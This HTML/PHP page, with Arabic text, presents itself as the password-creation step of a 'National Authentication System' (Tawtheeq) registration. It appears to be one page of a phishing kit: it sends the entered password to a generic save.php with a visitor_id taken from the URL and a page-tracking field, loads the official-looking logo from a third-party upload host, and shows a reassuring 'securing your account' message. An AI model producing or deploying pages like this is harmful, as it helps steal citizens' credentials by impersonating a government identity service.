<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التوثيق الوطني - إنشاء كلمة المرور</title>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        :root {
            --primary-color: #007fb1;
            --bg-color: #f5f5f5;
            --secondary-color: #8a1538;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            margin: 0; padding: 0; color: #333;
            overflow-x: hidden;
        }
        
        .header {
            background-color: #fff;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ddd;
            height: 70px;
        }
        .header-right-group { display: flex; align-items: center; gap: 15px; }
        .menu-icon {
            display: flex; flex-direction: column; justify-content: space-between;
            width: 22px; height: 16px; cursor: pointer;
        }
        .menu-icon span { display: block; height: 2px; width: 100%; background-color: var(--primary-color); border-radius: 2px; }
        .logo-tawtheeq { height: 50px; }
        .header-text-left { text-align: left; }

        .container { max-width: 500px; margin: 20px auto; padding: 10px; }
        
        .steps-container {
            display: flex; justify-content: space-between; margin-bottom: 30px; position: relative;
        }
        .steps-container::before {
            content: ""; position: absolute; top: 15px; left: 0; right: 0; height: 1px; background: #ccc; z-index: 1;
        }
        .step { z-index: 2; text-align: center; flex: 1; }
        .step-number {
            width: 30px; height: 30px; background: #fff; border: 1px solid #ccc; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; margin: 0 auto 5px; font-weight: bold; color: #666;
        }
        .step-completed .step-number { background: #e0f2f1; color: var(--primary-color); border-color: var(--primary-color); }
        .step.active .step-number { background: var(--primary-color); color: #fff; border-color: var(--primary-color); }
        .step-label { font-size: 11px; font-weight: bold; line-height: 1.2; }

        .form-card {
            background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .form-card h2 { font-size: 18px; margin-top: 0; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        
        .rules-box {
            background-color: #e3f2fd;
            border: 1px solid #bbdefb;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 25px;
        }
        .rules-box h3 { font-size: 14px; margin: 0 0 10px 0; color: #333; }
        .rules-list { margin: 0; padding: 0; list-style: none; font-size: 13px; color: #555; }
        .rules-list li { margin-bottom: 5px; display: flex; align-items: center; }
        .rules-list li::before { content: "•"; color: var(--primary-color); font-weight: bold; margin-left: 8px; }

        .form-group { margin-bottom: 20px; }
        input[type="password"] {
            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; outline: none;
        }
        input.error-input { border-color: red !important; background-color: #fff0f0; }

        .btn-container { margin-top: 25px; }
        .btn-submit {
            width: 100%; background-color: var(--primary-color); color: white; border: none;
            padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s;
        }
        .btn-submit:hover { opacity: 0.8; }

        .footer-text { text-align: center; margin-top: 30px; font-size: 13px; color: #666; padding-bottom: 20px; }

        #loading-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.95); z-index: 9999;
            flex-direction: column; align-items: center; justify-content: center;
        }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid var(--primary-color);
            border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p style="margin-top: 15px; font-weight: bold; color: var(--primary-color);">جاري تأمين حسابك، يرجى الانتظار...</p>
    </div>

    <div class="header">
        <div class="header-right-group">
            <div class="menu-icon"><span></span><span></span><span></span></div>
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" class="logo-tawtheeq" alt="Tawtheeq Logo">
        </div>
        <div class="header-text-left">
            <div style="color: var(--secondary-color); font-weight: bold; font-size: 16px;">نظام التوثيق الوطني</div>
            <div style="font-size: 11px; color: #666;">National Authentication System</div>
        </div>
    </div>

    <div class="container">
        <div class="steps-container">
            <div class="step step-completed"><div class="step-number">✓</div><div class="step-label">نوع<br>الحساب</div></div>
            <div class="step step-completed"><div class="step-number">✓</div><div class="step-label">البيانات<br>الشخصية</div></div>
            <div class="step active"><div class="step-number">٣</div><div class="step-label">كلمة<br>المرور</div></div>
            <div class="step"><div class="step-number">٤</div><div class="step-label">إتمام التسجيل</div></div>
        </div>

        <div class="form-card">
            <h2>إنشاء كلمة المرور</h2>
            
            <div class="rules-box">
                <h3>قواعد إدخال كلمة المرور</h3>
                <ul class="rules-list">
                    <li>يجب أن تتكون كلمة المرور من 8 أحرف على الأقل.</li>
                    <li>يجب أن تحتوي على حرف كبير واحد على الأقل (A-Z).</li>
                    <li>يجب أن تحتوي على حرف صغير واحد على الأقل (a-z).</li>
                    <li>يجب أن تحتوي على رقم واحد على الأقل (0-9).</li>
                </ul>
            </div>

            <form id="passwordForm" action="save.php" method="POST">
                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($_GET['visitor_id'] ?? ''); ?>">
                <input type="hidden" name="current_page" value="password.php">
                <div class="form-group">
                    <input type="password" name="password" id="pass" placeholder="أدخل كلمة المرور" required>
                </div>
                <div class="form-group">
                    <input type="password" id="pass_confirm" placeholder="أعد إدخال كلمة المرور" required>
                </div>

                <div class="btn-container">
                    <button type="submit" class="btn btn-submit">استمرار</button>
                </div>
            </form>
        </div>
        <div class="footer-text">نظام التوثيق الوطني - جميع الحقوق © 2026 محفوظة</div>
    </div>

    <script>
        document.getElementById('passwordForm').onsubmit = (e) => {
            e.preventDefault();
            const p1 = document.getElementById('pass');
            const p2 = document.getElementById('pass_confirm');
            
            // Regex: 8 خانات، حرف كبير، حرف صغير، رقم
            const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;

            // التحقق من صحة الباسورد
            if (!passwordRegex.test(p1.value)) {
                p1.classList.add('error-input');
                Swal.fire({ title: 'خطأ!', text: 'كلمة المرور غير صالحة، يجب أن تتكون من 8 خانات وتشمل حروفاً كبيرة وصغيرة وأرقاماً.', icon: 'error', confirmButtonColor: '#8a1538' });
                return;
            } else {
                p1.classList.remove('error-input');
            }

            // التحقق من التطابق
            if (p1.value !== p2.value) {
                p2.classList.add('error-input');
                Swal.fire({ title: 'خطأ!', text: 'كلمات المرور غير متطابقة', icon: 'error', confirmButtonColor: '#8a1538' });
                return;
            } else {
                p2.classList.remove('error-input');
            }

            // إرسال الفورم فوراً لـ save.php لضمان الانتقال السريع
            document.getElementById('passwordForm').submit();
        };
    </script>
</body>
</html>
